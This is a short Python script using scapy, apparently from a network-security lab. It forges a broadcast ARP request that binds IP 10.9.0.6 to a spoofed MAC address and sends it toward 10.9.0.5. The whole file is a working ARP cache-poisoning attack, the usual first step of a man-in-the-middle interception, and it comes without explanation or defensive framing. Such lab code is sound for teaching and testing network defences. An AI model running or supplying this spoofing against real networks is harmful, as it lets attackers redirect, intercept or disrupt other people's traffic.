#!/usr/bin/env python3
from scapy.all import *

IP_V       = "10.9.0.5"
MAC_V_real = "02:42:0a:09:00:05"

IP_B       = "10.9.0.6"
MAC_B = "02:42:0a:09:00:69"

# Constructing ARP Request packet
ether  = Ether(src = MAC_B, dst = "ff:ff:ff:ff:ff:ff")
arp    = ARP(psrc = IP_B , hwsrc = MAC_B, pdst = IP_V)
arp.op = 1   # Request

frame  = ether/arp
sendp(frame)

